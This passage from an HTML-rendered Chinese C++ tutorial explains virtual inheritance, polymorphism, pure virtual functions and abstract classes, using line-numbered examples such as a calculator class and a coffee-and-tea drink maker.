class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//继承前加virtual关键字后，变为虚继承</span></span><br><span class="line"><span class="comment">//此时公共的父类Animal称为虚基类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sheep</span> :</span> virtual public Animal &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tuo</span>   :</span> virtual public Animal &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SheepTuo</span> :</span> public Sheep, public Tuo &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">SheepTuo st;</span><br><span class="line">st.Sheep::m_Age = <span class="number">100</span>;</span><br><span class="line">st.Tuo::m_Age = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;st.Sheep::m_Age = &quot;</span> &lt;&lt; st.Sheep::m_Age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;st.Tuo::m_Age = &quot;</span> &lt;&lt;  st.Tuo::m_Age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;st.m_Age = &quot;</span> &lt;&lt; st.m_Age &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>菱形继承带来的主要问题是子类继承两份相同的数据，导致资源浪费以及毫无意义</li><li>利用虚继承可以解决菱形继承问题</li></ul><h3 id="4-7-多态">4.7   多态</h3><h4 id="4-7-1-多态的基本概念">4.7.1 多态的基本概念</h4><p><strong>多态是 C++面向对象三大特性之一</strong></p><p>多态分为两类</p><ul><li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li><li>动态多态: 派生类和虚函数实现运行时多态</li></ul><p>静态多态和动态多态区别：</p><ul><li>静态多态的函数地址早绑定  -   编译阶段确定函数地址</li><li>动态多态的函数地址晚绑定  -   运行阶段确定函数地址</li></ul><p>下面通过案例进行讲解多态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//Speak函数就是虚函数</span></span><br><span class="line"><span class="comment">//函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">speak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;动物在说话&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> :</span>public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">speak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;小猫在说话&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span>public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">speak</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;小狗在说话&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//我们希望传入什么对象，那么就调用什么对象的函数</span></span><br><span class="line"><span class="comment">//如果函数地址在编译阶段就能确定，那么静态联编</span></span><br><span class="line"><span class="comment">//如果函数地址在运行阶段才能确定，就是动态联编</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DoSpeak</span><span class="params">(Animal &amp; animal)</span></span><br><span class="line">&#123;</span><br><span class="line">animal.speak();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//多态满足条件：</span></span><br><span class="line"><span class="comment">//1、有继承关系</span></span><br><span class="line"><span class="comment">//2、子类重写父类中的虚函数</span></span><br><span class="line"><span class="comment">//多态使用：</span></span><br><span class="line"><span class="comment">//父类指针或引用指向子类对象</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Cat cat;</span><br><span class="line">DoSpeak(cat);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dog dog;</span><br><span class="line">DoSpeak(dog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><p>多态满足条件</p><ul><li>有继承关系</li><li>子类重写父类中的虚函数</li></ul><p>多态使用条件</p><ul><li>父类指针或引用指向子类对象</li></ul><p>重写：函数返回值类型   函数名 参数列表 完全一致称为重写</p><h4 id="4-7-2-多态案例一-计算器类">4.7.2 多态案例一-计算器类</h4><p>案例描述：</p><p>分别利用普通写法和多态技术，设计实现两个操作数进行运算的计算器类</p><p>多态的优点：</p><ul><li>代码组织结构清晰</li><li>可读性强</li><li>利于前期和后期的扩展以及维护</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calculator</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> <span class="title function_">getResult</span><span class="params">(<span class="built_in">string</span> oper)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (oper == <span class="string">&quot;+&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> m_Num1 + m_Num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (oper == <span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> m_Num1 - m_Num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (oper == <span class="string">&quot;*&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> m_Num1 * m_Num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果要提供新的运算，需要修改源码</span></span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_Num1;</span><br><span class="line"><span class="type">int</span> m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//普通实现测试</span></span><br><span class="line">Calculator c;</span><br><span class="line">c.m_Num1 = <span class="number">10</span>;</span><br><span class="line">c.m_Num2 = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.getResult(<span class="string">&quot;+&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.getResult(<span class="string">&quot;-&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c.m_Num1 &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; c.m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; c.getResult(<span class="string">&quot;*&quot;</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//多态实现</span></span><br><span class="line"><span class="comment">//抽象计算器类</span></span><br><span class="line"><span class="comment">//多态优点：代码组织结构清晰，可读性强，利于前期和后期的扩展以及维护</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractCalculator</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public :</span><br><span class="line"></span><br><span class="line">virtual <span class="type">int</span> <span class="title function_">getResult</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> m_Num1;</span><br><span class="line"><span class="type">int</span> m_Num2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加法计算器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AddCalculator</span> :</span>public AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> <span class="title function_">getResult</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_Num1 + m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//减法计算器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubCalculator</span> :</span>public AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> <span class="title function_">getResult</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_Num1 - m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//乘法计算器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MulCalculator</span> :</span>public AbstractCalculator</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> <span class="title function_">getResult</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> m_Num1 * m_Num2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test02</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//创建加法计算器</span></span><br><span class="line">AbstractCalculator *abc = new AddCalculator;</span><br><span class="line">abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;getResult() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">delete abc;  <span class="comment">//用完了记得销毁</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建减法计算器</span></span><br><span class="line">abc = new SubCalculator;</span><br><span class="line">abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;getResult() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">delete abc;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建乘法计算器</span></span><br><span class="line">abc = new MulCalculator;</span><br><span class="line">abc-&gt;m_Num1 = <span class="number">10</span>;</span><br><span class="line">abc-&gt;m_Num2 = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; abc-&gt;m_Num1 &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; abc-&gt;m_Num2 &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; abc-&gt;getResult() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">delete abc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">test02();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：C++开发提倡利用多态设计程序架构，因为多态优点很多</p></blockquote><h4 id="4-7-3-纯虚函数和抽象类">4.7.3 纯虚函数和抽象类</h4><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容</p><p>因此可以将虚函数改为<strong>纯虚函数</strong></p><p>纯虚函数语法：<code>virtual 返回值类型 函数名 （参数列表）= 0 ;</code></p><p>当类中有了纯虚函数，这个类也称为抽象类</p><p><strong>抽象类特点</strong>：</p><ul><li>无法实例化对象</li><li>子类必须重写抽象类中的纯虚函数，否则也属于抽象类</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//纯虚函数</span></span><br><span class="line"><span class="comment">//类中只要有一个纯虚函数就称为抽象类</span></span><br><span class="line"><span class="comment">//抽象类无法实例化对象</span></span><br><span class="line"><span class="comment">//子类必须重写父类中的纯虚函数，否则也属于抽象类</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span>public Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Base * base = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//base = new Base; // 错误，抽象类无法实例化对象</span></span><br><span class="line">base = new Son;</span><br><span class="line">base-&gt;func();</span><br><span class="line">delete base;<span class="comment">//记得销毁</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-7-4-多态案例二-制作饮品">4.7.4 多态案例二-制作饮品</h4><p><strong>案例描述：</strong></p><p>制作饮品的大致流程为：煮水 -   冲泡 - 倒入杯中 - 加入辅料</p><p>利用多态技术实现本案例，提供抽象制作饮品基类，提供子类制作咖啡和茶叶</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//抽象制作饮品</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractDrinking</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="comment">//烧水</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Boil</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//冲泡</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Brew</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//倒入杯中</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">PourInCup</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//加入辅料</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">PutSomething</span><span class="params">()</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//规定流程</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MakeDrink</span><span class="params">()</span> &#123;</span><br><span class="line">Boil();</span><br><span class="line">Brew();</span><br><span class="line">PourInCup();</span><br><span class="line">PutSomething();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//制作咖啡</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Coffee</span> :</span> public AbstractDrinking &#123;</span><br><span class="line">public:</span><br><span class="line"><span class="comment">//烧水</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Boil</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;煮农夫山泉!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//冲泡</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Brew</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;冲泡咖啡!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//倒入杯中</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">PourInCup</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;将咖啡倒入杯中!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加入辅料</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">PutSomething</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;加入牛奶!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//制作茶水</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tea</span> :</span> public AbstractDrinking &#123;</span><br><span class="line">public:</span><br><span class="line"><span class="comment">//烧水</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Boil</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;煮自来水!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//冲泡</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">Brew</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;冲泡茶叶!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//倒入杯中</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">PourInCup</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;将茶水倒入杯中!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加入辅料</span></span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">PutSomething</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;加入枸杞!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//业务函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DoWork</span><span class="params">(AbstractDrinking* drink)</span> &#123;</span><br><span class="line">drink-&gt;MakeDrink();</span><br><span class="line">delete drink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span> &#123;</span><br><span class="line">DoWork(new Coffee);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">DoWork(new Tea);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-7-5-虚析构和纯虚析构">4.7.5 